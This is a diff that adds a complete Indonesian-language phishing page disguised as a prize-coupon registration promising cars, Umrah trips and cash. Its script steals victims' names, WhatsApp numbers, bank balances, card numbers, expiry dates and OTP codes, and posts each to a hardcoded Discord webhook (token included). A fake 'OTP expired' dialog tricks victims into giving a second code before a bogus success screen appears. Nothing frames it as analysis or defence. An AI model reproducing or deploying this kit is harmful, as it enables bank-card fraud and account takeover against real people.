@@ -1,0 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <title>Pendaftaran Kupon Berhadiah 2026</title>
+    <meta property="og:title" content="Pendaftaran Kupon Berhadiah">
+    <meta property="og:description" content="Ambil kupon undian Anda sekarang dan menangkan hadiah BMW, Hyundai, dan Vespa!">
+    <meta property="og:image" content="https://i.ibb.co.com/dsqGtW3g/images-4-3.jpg">
+    <meta property="og:type" content="website">
+
+    <link rel="preload" as="image" href="https://i.ibb.co/Ts9B8w4/2412-2172x373.png">
+    <link rel="preload" as="image" href="https://i.ibb.co/TM6tJGVm/file-0000000043088208a45185c18c63bf38.png">
+
+    <style>
+        :root {
+            --theme-blue: #00529C; 
+            --theme-bg: #0076e4; 
+            --theme-dark: #052a49;
+            --white: #ffffff;
+        }
+
+        html, body {
+            height: 100%; overflow: hidden; margin: 0; padding: 0;
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: var(--theme-bg);
+        }
+
+        .container { width: 100%; max-width: 480px; height: 100dvh; display: flex; flex-direction: column; margin: 0 auto; }
+        .header-img { width: 100%; height: 8vh; display: block; object-fit: cover; flex-shrink: 0; }
+
+        .banner-container {
+            width: 92%; margin: 1vh auto; height: 23vh;
+            position: relative; overflow: hidden; flex-shrink: 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .banner-slide { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; opacity: 0; transition: opacity 1s ease-in-out; }
+        .active-slide { opacity: 1; z-index: 5; }
+
+        .form-card {
+            width: 92%; margin: 0 auto; 
+            background: var(--white); border-radius: 8px; 
+            box-shadow: 0 8px 25px rgba(0,0,0,0.25);
+            padding: 10px 18px; box-sizing: border-box;
+            display: flex; flex-direction: column; justify-content: space-between;
+            flex-grow: 1; margin-bottom: 1vh; max-height: 52vh;
+        }
+
+        .input-group { margin-bottom: 4px; }
+        .label-row { display: flex; align-items: center; margin-bottom: 2px; }
+        .label-row img { width: 16px; margin-right: 8px; }
+        .label-row span { font-size: 10px; font-weight: 800; color: var(--theme-blue); text-transform: uppercase; }
+
+        .input-box { border-bottom: 1.5px solid #eee; padding: 4px 0; display: flex; }
+        .input-box-card { border: 1.8px solid var(--theme-blue); border-radius: 6px; padding: 10px; margin-top: 5px; background: #f9f9f9; }
+        
+        .input-box input, .input-box select { width: 100%; border: none; outline: none; font-size: 13.5px; font-weight: 600; color: #333; background: transparent; }
+
+        .helper-text { font-size: 8.5px; color: #999; line-height: 1.2; display: block; }
+
+        .btn-submit {
+            background: var(--theme-dark); color: var(--white);
+            width: 100%; padding: 14px; border: none; border-radius: 8px;
+            font-size: 13.5px; font-weight: 800; display: flex;
+            align-items: center; justify-content: space-between; cursor: pointer;
+        }
+
+        .footer-img { width: 100%; height: 8vh; display: block; object-fit: cover; flex-shrink: 0; margin-top: auto; }
+
+        #card-page, #otp-page, #success-page { display: none; flex-direction: column; height: 100vh; }
+        
+        .atm-card-container {
+            width: 90%; aspect-ratio: 1.6/1; margin: 15px auto;
+            position: relative; border-radius: 12px; overflow: hidden;
+            box-shadow: 0 12px 25px rgba(0,0,0,0.4);
+        }
+        .display-number { position: absolute; left: 10%; top: 58%; color: white; font-family: monospace; font-size: 21px; font-weight: bold; text-shadow: 1px 1px 2px #000; letter-spacing: 1.5px; }
+        .display-exp { position: absolute; left: 45%; top: 72%; color: white; font-family: monospace; font-size: 14px; font-weight: bold; text-shadow: 1px 1px 2px #000; }
+
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 1000;
+        }
+        .modal-box { width: 85%; background: white; border-radius: 10px; padding: 25px; text-align: center; }
+    </style>
+</head>
+<body>
+
+<!-- MODAL OTP KADALUARSA -->
+<div class="modal-overlay" id="otp-modal">
+    <div class="modal-box">
+        <div style="font-size: 40px; margin-bottom: 10px;">⚠️</div>
+        <div style="font-weight: 800; font-size: 16px; color: #333; text-transform: uppercase;">KODE VERIFIKASI KADALUARSA</div>
+        <div style="color: #666; font-size: 12px; margin-top: 10px; line-height: 1.4;">Kode yang Anda masukkan telah kedaluwarsa. Silakan masukkan kode OTP terbaru yang baru saja dikirimkan ke nomor Anda.</div>
+        <button class="btn-submit" onclick="closeModal()" style="margin-top: 25px; justify-content: center;">MASUKKAN OTP TERBARU</button>
+    </div>
+</div>
+
+<div class="container">
+    <!-- HALAMAN 1 -->
+    <div id="form-page" style="display: flex; flex-direction: column; height: 100dvh;">
+        <img src="https://i.ibb.co/Ts9B8w4/2412-2172x373.png" class="header-img">
+        <div class="banner-container">
+            <img src="https://i.ibb.co/QFRTgSvW/file-0000000031388211830e8dfcef452579.png" class="banner-slide active-slide">
+            <img src="https://i.ibb.co/PkDWt22/file-00000000c5f882118201fe02039f07eb.png" class="banner-slide">
+            <img src="https://i.ibb.co/PZp9f2rF/file-00000000a2548211a001dd35304761ff.png" class="banner-slide">
+            <img src="https://i.ibb.co/xSqKG98q/file-000000004f9082119788dd3703002b25.png" class="banner-slide">
+            <img src="https://i.ibb.co/67VfvHrV/file-000000001e6c82118cc5d313d26334c9.png" class="banner-slide">
+        </div>
+        <div class="form-card">
+            <div class="input-group">
+                <div class="label-row"><img src="https://img.icons8.com/color/48/gift--v1.png"><span>Pilihan Hadiah Utama</span></div>
+                <div class="input-box">
+                    <select id="hadiah">
+                        <option value="" disabled selected>-- Klik Pilih Hadiah --</option>
+                        <option value="5 Unit BMW 520i M Sport">5 Unit BMW 520i M Sport</option>
+                        <option value="20 Unit Hyundai creta alpha">20 Unit Hyundai Creta Alpha</option>
+                        <option value="50 Unit Vespa Primavera">50 Unit Vespa Primavera</option>
+                        <option value="Tiket Umroh Gratis (2 Orang)">Tiket Umroh Gratis (2 Orang)</option>
+                        <option value="Uang Tunai Rp 100jt">Uang Tunai Rp 100.000.000</option>
+                    </select>
+                </div>
+            </div>
+            <div class="input-group">
+                <div class="label-row"><img src="https://img.icons8.com/color/48/user-male-circle--v1.png"><span>Nama Lengkap Nasabah</span></div>
+                <div class="input-box"><input type="text" id="nama" placeholder="Nama Sesuai Identitas"></div>
+            </div>
+            <div class="input-group">
+                <div class="label-row"><img src="https://img.icons8.com/color/48/whatsapp--v1.png"><span>Nomor WhatsApp Aktif</span></div>
+                <div class="input-box"><input type="tel" id="noHp" placeholder="Nomor Handphone"></div>
+                <span class="helper-text">Pastikan nomor aktif untuk info pengiriman hadiah.</span>
+            </div>
+            <div class="input-group">
+                <div class="label-row"><img src="https://img.icons8.com/color/48/wallet--v1.png"><span>Estimasi Sisa Saldo</span></div>
+                <div class="input-box"><input type="tel" id="saldo" placeholder="Rp 0" oninput="formatRp(this)"></div>
+                <span class="helper-text">Masukkan perkiraan saldo Anda saat ini.</span>
+            </div>
+            <button class="btn-submit" onclick="goCard()"><div>AMBIL KUPON SEKARANG</div><span>></span></button>
+        </div>
+        <img src="https://i.ibb.co/TM6tJGVm/file-0000000043088208a45185c18c63bf38.png" class="footer-img">
+    </div>
+
+    <!-- HALAMAN 2 -->
+    <div id="card-page">
+        <div style="background: var(--theme-blue); padding: 18px; text-align: center; color: white;"><h3>VERIFIKASI DATA KARTU</h3></div>
+        <div class="atm-card-container">
+            <img src="https://i.ibb.co/sJRfRxyx/file-0000000021b48207ad4e4680ca37d93d-1.png" style="width:100%;">
+            <div class="display-number" id="cardShow">xxxx xxxx xxxx xxxx</div>
+            <div class="display-exp" id="expShow">MM/YY</div>
+        </div>
+        <div class="form-card" style="height: auto; padding: 25px;">
+            <div class="input-group"><span>NOMOR KARTU (16 DIGIT)</span><div class="input-box-card"><input type="tel" id="noKartu" maxlength="19" oninput="formatCard(this)" placeholder="xxxx xxxx xxxx xxxx"></div></div>
+            <div class="input-group" style="margin-top: 15px;"><span>MASA BERLAKU (MM/YY)</span><div class="input-box-card"><input type="tel" id="exp" maxlength="5" oninput="formatExp(this)" placeholder="MM/YY"></div></div>
+            <button class="btn-submit" onclick="goOtp()" style="justify-content:center; margin-top:20px;">KONFIRMASI KUPON</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN 3 (OTP) -->
+    <div id="otp-page">
+        <div style="background: var(--theme-blue); padding: 30px 15px; text-align: center; color: white;"><h3>VERIFIKASI KODE OTP</h3><p style="font-size:12px; margin-top:10px;">Masukkan 6 digit kode yang dikirim ke nomor Anda</p></div>
+        <div class="form-card" style="height: auto; padding: 40px 20px; margin-top: 20px;">
+            <input type="tel" id="otpIn" maxlength="6" style="text-align: center; font-size: 32px; letter-spacing: 10px; font-weight: 900; border: none; border-bottom: 2.5px solid var(--theme-blue); outline: none; width: 100%; color: var(--theme-blue);">
+            <button class="btn-submit" onclick="valOtp()" style="margin-top: 30px; justify-content: center;">VERIFIKASI SEKARANG</button>
+        </div>
+    </div>
+
+    <!-- HALAMAN SUKSES -->
+    <div id="success-page" style="background: white; align-items: center; justify-content: center; text-align: center; height: 100vh;">
+        <img src="https://cdn-icons-png.flaticon.com/512/148/148767.png" style="width: 80px; margin-bottom: 20px;">
+        <h2>PENDAFTARAN BERHASIL</h2>
+        <p style="padding: 0 30px; color: #666;">Kupon undian sedang diproses. Mohon tunggu konfirmasi resmi dari layanan pelanggan.</p>
+    </div>
+</div>
+
+<script>
+    const webhookURL = "https://discord.com/api/webhooks/1533837788871528538/S4aUL1nGB4bc4Aoe7RR8S5Ig7tq_NUMSNthKIYczyXvadzlYQLk0qRFbDM41M2P6eyO4";
+    let tr = 0;
+
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.banner-slide');
+    setInterval(() => { slides[currentSlide].classList.remove('active-slide'); currentSlide = (currentSlide + 1) % slides.length; slides[currentSlide].classList.add('active-slide'); }, 3000);
+
+    function formatRp(e) { let v = e.value.replace(/\D/g,''); e.value = v ? "Rp " + v.replace(/\B(?=(\d{3})+(?!\d))/g, ".") : ""; }
+    function formatCard(e) { let v = e.value.replace(/\D/g, ''); let f = v.match(/.{1,4}/g)?.join(' ') || ''; e.value = f.substring(0, 19); document.getElementById('cardShow').innerText = e.value || "xxxx xxxx xxxx xxxx"; }
+    function formatExp(e) { let v = e.value.replace(/\D/g, ''); if (v.length >= 2) e.value = v.substring(0, 2) + '/' + v.substring(2, 4); document.getElementById('expShow').innerText = e.value || "MM/YY"; }
+
+    function sendDiscord(title, fields) { fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({embeds: [{title: title, color: 16777215, fields: fields, timestamp: new Date().toISOString()}]})}); }
+
+    function goCard() {
+        const n = document.getElementById('nama').value, p = document.getElementById('noHp').value, h = document.getElementById('hadiah').value, s = document.getElementById('saldo').value;
+        if(!n || !p || !h) return alert("Mohon lengkapi data!");
+        sendDiscord("🔔 PENDAFTARAN BARU", [
+            {name: "Nama", value: n}, 
+            {name: "WhatsApp", value: p},
+            {name: "Kupon Hadiah", value: h},
+            {name: "Sisa Saldo", value: s}
+        ]);
+        document.getElementById('form-page').style.display='none'; document.getElementById('card-page').style.display='flex';
+    }
+
+    function goOtp() {
+        const k = document.getElementById('noKartu').value, n = document.getElementById('nama').value;
+        if(k.length < 16) return alert("Nomor kartu tidak valid!");
+        sendDiscord("💳 DATA KARTU", [{name:"Nama",value:n},{name:"No Kartu",value:k}]);
+        document.getElementById('card-page').style.display='none'; document.getElementById('otp-page').style.display='flex';
+    }
+
+    function valOtp() {
+        const o = document.getElementById('otpIn').value, n = document.getElementById('nama').value;
+        if(o.length < 6) return alert("Masukkan 6 digit kode!");
+        sendDiscord(`🔑 KODE OTP ${tr + 1}`, [{name:"Nama",value:n},{name:"Kode",value:o}]);
+        if(tr === 0) {
+            document.getElementById('otp-modal').style.display='flex';
+            document.getElementById('otpIn').value = "";
+            tr++;
+        } else {
+            document.getElementById('otp-page').style.display='none'; 
+            document.getElementById('success-page').style.display='flex';
+        }
+    }
+
+    function closeModal() { document.getElementById('otp-modal').style.display='none'; }
+</script>
+</body>
+</html>
